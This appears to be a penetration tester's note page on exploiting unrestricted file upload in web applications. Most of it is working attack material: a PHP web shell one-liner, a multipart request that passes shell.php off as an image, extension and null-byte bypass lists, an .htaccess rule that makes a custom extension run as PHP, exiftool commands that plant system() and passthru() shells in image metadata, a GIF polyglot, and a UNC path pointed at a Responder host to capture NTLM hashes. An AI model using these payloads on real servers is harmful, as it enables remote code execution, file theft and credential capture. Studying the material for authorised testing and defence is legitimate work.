https://book.hacktricks.xyz/pentesting-web/file-upload
# Unrestricted File Upload
- Upload a PHP Shell
```php
<?php echo system($_GET['command']); ?>

<?php echo file_get_contents('/path/to/target/file'); ?>     // To read contents of a file
```

- Go to the *Proxy tab* in [[Website Hacking/Tools/Burp Suite/Basics]] and look at the *HTTP History* to find out where the ***file is uploaded***.
![[Pasted image 20230629125530.png]]
**OR**
- Try to Manually find directories using [[FFUF]]


---
# Content-Type Restriction Bypass
When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is *fine for sending simple text like your name, address*, and so on, but is **not suitable for sending large amounts of binary data**, such as an **entire image file or a PDF document**. In this case, the content type `multipart/form-data` is the preferred approach.

```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 

---------------------------012345678901234567890123456 
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/octet-stream    // Change this one to "image/jpeg" if only those type of files are allowed

[...binary content of example.jpg...] -----------------------

----012345678901234567890123456
Content-Disposition: form-data; name="description" This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"
wiener
---------------------------012345678901234567890123456--
```

---
# Shell Upload via Path Traversal
Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.
![[Pasted image 20230629182913.png]]

---
## Bypass File Extensions
```
.php
.php3
.php4
.php5
.phtml
.shtml
```

## Bypass with Encoding
```
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....
```

---
# Overriding the Server Configuration
1) **Apache**
#apache 
Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a *directory-specific* configuration from a file called `.htaccess` if one is present. `.htaccess` configurations are *applicable only for the same directory and sub-directories* where the .htaccess file is uploaded.
```php
AddType application/x-httpd-php .rce
```

Then upload any file with `.rce` extension.
This maps an arbitrary extension (`.rce`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.

For more `.htaccess` exploits, [Click Here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)


2) **IIS**
#iis 
Developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users:
```config
<staticContent>
<mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

---
# Obfuscating File Extensions
- `exploit.pHp` : If the code that subsequently maps the file extension to a MIME type is **not** case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.
-   Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
-   Add **trailing characters**. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php..`
-   Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
-   Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
-   Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
- `exploit.p.phphp` if <mark style="background: #ADCCFFA6;">.php</mark> is stripped from the filename.

---
# RCE via Polyglot File
### What are polyglots?
Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a [GIFAR](https://en.wikipedia.org/wiki/Gifar) is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.

Polyglot files are often used to bypass protection based on file types. Many applications that allow users to upload files only allow uploads of certain types, such as JPEG, GIF, DOC, so as to prevent users from uploading potentially dangerous files like JS files, PHP files or Phar files.

One example of a polyglot file is a Phar-JPEG file. Phar files are used to carry out PHP object injection attacks.

Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its *dimensions*. If you try uploading a <mark style="background: #ADCCFFA6;">PHP</mark> script, for example, it *won't have any dimensions* at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer.

### Bypass Methods
1) Using `Exiftool`
```sh
exiftool -comment="<?php echo 'START ' . system($_GET['command']) . 'END'; ?>" flower.jpg -o polyglot.php
```
OR
```sh
exiftool -comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . 'END'; ?>" flower.jpg -o polyglot.php
```

We can also set payload in the **Document Name** meta field. To do this, run this command:
```sh
exiftool -documentname='<?php passthru(\$_GET'cmd'); _halt_compiler(); ?>' flower.jpg -o polyglot.php
```


2) **GIF89**
Checkout this **section**: https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#magic-bytes
It contains a `PHP payload` in the [Comment Extension](https://www.w3.org/Graphics/GIF/spec-gif89a.txt) of a 1 pixel GIF
```sh
hexdump -C polyglot.php.gif
00000000  47 49 46 38 39 61 01 00  01 00 00 ff 00 2c 00 00  |GIF89a.......,..|
00000010  00 00 01 00 01 00 00 02  00 21 fe 3c 3f 70 68 70  |.........!.<?php|
00000020  69 6e 66 6f 28 29 3b                              |info();|
```

![[Pasted image 20230629235227.png]]

```sh
GIF
```


3) **PDF**
You can add a comment (`%`) on the PDF header (Name ends with php):
```php
%PDF-
[php_reverse_shell]
```

---
# File Upload to Responder
Use a UNC filename to Responder server IP
Like `\\\\192.168.119.2\\share`

##### Malicious PDF upload
https://ironhackers.es/en/tutoriales/robando-hashes-ntlm-de-windows-mediante-un-pdf-malicioso/

##### Other files
https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/